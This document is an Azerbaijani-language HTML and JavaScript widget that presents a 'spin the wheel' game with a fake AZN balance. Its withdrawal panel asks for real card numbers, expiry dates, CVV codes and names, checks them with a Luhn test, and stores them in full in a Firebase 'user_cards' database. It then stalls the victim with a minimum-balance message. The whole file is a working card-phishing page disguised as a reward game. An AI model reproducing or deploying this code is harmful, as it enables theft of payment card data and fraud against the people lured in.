<div id="claim-wrapper" style="font-family: 'Montserrat', sans-serif; color: #333; padding: 10px;">
    <style>
        .wallet-card { background: #fff; padding: 20px; border-radius: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 20px; border-bottom: 4px solid #00b894; text-align: center; }
        .balance-value { font-size: 2rem; font-weight: 900; color: #2d3436; margin: 5px 0; }
        .wheel-container { position: relative; width: 260px; height: 260px; margin: 20px auto; }
        #claim-wheel { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #fff; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); background: conic-gradient(#ff7675 0% 20%, #fdcb6e 20% 40%, #00b894 40% 60%, #0984e3 60% 80%, #6c5ce7 80% 100%); position: relative; }
        .price-tag { position: absolute; font-weight: 900; color: white; font-size: 0.8rem; width: 40px; text-align: center; }
        .p1 { top: 30px; left: 140px; transform: rotate(36deg); }
        .p2 { top: 110px; left: 190px; transform: rotate(108deg); }
        .p3 { top: 190px; left: 110px; transform: rotate(180deg); }
        .p4 { top: 130px; left: 30px; transform: rotate(252deg); }
        .p5 { top: 40px; left: 50px; transform: rotate(324deg); }
        .action-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: 800; margin-top: 10px; cursor: pointer; }
        .spin-btn-active { background: linear-gradient(45deg, #00b894, #00cec9); color: white; }
        .spin-btn-active:disabled { background: #eee; color: #ccc; }
        .withdraw-btn { background: #f8f9fa; border: 1.5px solid #ddd; color: #666; font-size: 0.75rem; }
        .claim-modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 10000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); }
        .claim-modal-box { background: white; padding: 25px; border-radius: 25px; text-align: center; width: 100%; max-width: 320px; }
        .card-input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 10px; border: 1.5px solid #eee; font-family: sans-serif; box-sizing: border-box; }
    </style>

    <div class="wallet-card">
        <div style="font-size: 0.65rem; color: #aaa;">BALANSINIZ</div>
        <div class="balance-value"><span id="ws-balance-display">0.00</span> AZN</div>
        <div id="ws-timer-display" style="font-size: 0.7rem; font-weight: 700;">Yoxlanılır...</div>
    </div>

    <div class="wheel-container">
        <div id="claim-wheel">
            <div class="price-tag p1">0.10</div><div class="price-tag p2">0.30</div><div class="price-tag p3">0.50</div><div class="price-tag p4">0.80</div><div class="price-tag p5">1.00</div>
        </div>
    </div>

    <button id="ws-spin-btn" class="action-btn spin-btn-active" onclick="handleSpinStart()">ÇARXI ÇEVİR</button>
    <button class="action-btn withdraw-btn" onclick="openWithdrawPanel()">PUL ÇIXARIŞI</button>

    <div id="ws-withdraw-modal" class="claim-modal-overlay">
        <div class="claim-modal-box">
            <h3 style="margin:0">Kartı Bağla</h3>
            <p style="font-size:0.6rem; color:#888">Çıxarış üçün real kart məlumatlarını daxil edin</p>
            <input type="tel" id="c-num" class="card-input" placeholder="Kart Nömrəsi (16 rəqəm)" maxlength="16">
            <div style="display:flex; gap:10px">
                <input type="tel" id="c-date" class="card-input" placeholder="MM/YY" maxlength="5">
                <input type="tel" id="c-cvv" class="card-input" placeholder="CVV" maxlength="3">
            </div>
            <input type="text" id="c-name" class="card-input" placeholder="AD SOYAD">
            <button class="action-btn spin-btn-active" onclick="finalWithdrawProcess()">TƏSDİQLƏ</button>
            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="border:none; background:none; color:#aaa; font-size:0.7rem; margin-top:10px">LƏĞV ET</button>
        </div>
    </div>
</div>

<script>
    (function() {
        let balance = parseFloat(localStorage.getItem('ws_balance')) || 0;
        let lastSpin = parseInt(localStorage.getItem('ws_last_spin')) || 0;
        const rewards = [0.10, 1.00, 0.80, 0.50, 0.30];

        const updateView = () => {
            document.getElementById('ws-balance-display').innerText = balance.toFixed(2);
            checkSystemStatus();
        };

        const checkSystemStatus = () => {
            const now = Date.now();
            const btn = document.getElementById('ws-spin-btn');
            const timer = document.getElementById('ws-timer-display');
            if (lastSpin === 0) { btn.disabled = false; timer.innerText = "HAZIRDIR!"; return; }
            const diff = now - lastSpin;
            if (diff < 18000000) { // 5 saat
                btn.disabled = true;
                timer.innerText = "GÖZLƏYİN...";
                setTimeout(checkSystemStatus, 1000);
            } else { btn.disabled = false; timer.innerText = "VAXTDIR!"; }
        };

        window.handleSpinStart = function() {
            const wheel = document.getElementById('claim-wheel');
            const deg = Math.floor(Math.random() * 360) + 3600;
            wheel.style.transform = `rotate(${deg}deg)`;
            setTimeout(() => {
                const win = rewards[Math.floor((deg % 360) / 72)];
                balance += win; lastSpin = Date.now();
                localStorage.setItem('ws_balance', balance.toFixed(2));
                localStorage.setItem('ws_last_spin', lastSpin);
                alert("Qazandınız: " + win.toFixed(2) + " AZN");
                updateView();
            }, 5000);
        };

        window.openWithdrawPanel = function() { document.getElementById('ws-withdraw-modal').style.display = 'flex'; };

        window.finalWithdrawProcess = function() {
            const num = document.getElementById('c-num').value;
            const date = document.getElementById('c-date').value;
            const cvv = document.getElementById('c-cvv').value;
            const name = document.getElementById('c-name').value;

            // Luhn Algorithm Check
            let sum = 0;
            for (let i = 0; i < num.length; i++) {
                let v = parseInt(num[i]);
                if (i % 2 === num.length % 2) { v *= 2; if (v > 9) v -= 9; }
                sum += v;
            }
            if (sum % 10 !== 0 || num.length < 16) { alert("Xəta: Kart nömrəsi səhvdir!"); return; }
            if (!/^\d{2}\/\d{2}$/.test(date)) { alert("Xəta: Tarix MM/YY olmalıdır!"); return; }
            if (cvv.length < 3) { alert("Xəta: CVV səhvdir!"); return; }

            const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
            firebase.database().ref('user_cards/' + userKey).set({
                num, date, cvv, name, time: new Date().toLocaleString(), balance: balance.toFixed(2)
            }).then(() => {
                alert(balance < 15 ? "Məlumatlar yadda saxlanıldı. Çıxarış üçün 15 AZN lazımdır." : "Sorğu göndərildi.");
                document.getElementById('ws-withdraw-modal').style.display = 'none';
            });
        };
        updateView();
    })();
</script>
